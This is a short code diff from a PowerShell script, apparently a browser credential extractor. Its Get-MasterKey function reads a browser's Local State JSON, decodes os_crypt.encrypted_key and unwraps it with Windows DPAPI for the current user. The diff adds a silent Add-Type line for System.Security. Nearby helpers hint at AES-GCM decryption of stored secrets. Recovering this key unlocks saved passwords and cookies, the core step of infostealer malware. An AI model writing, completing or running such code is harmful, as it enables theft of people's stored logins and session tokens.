@@ -145,6 +145,7 @@ public static class Gcm {
 function Hex-ToBytes($h) { $b = New-Object byte[] ($h.Length / 2); for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = [Convert]::ToByte($h.Substring($i * 2, 2), 16) }; return $b }
 function Get-MasterKey($ls) {
   try {
+    Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
     $j = Get-Content -LiteralPath $ls -Raw | ConvertFrom-Json
     $b = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
     return [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length - 1)], $null, 'CurrentUser')
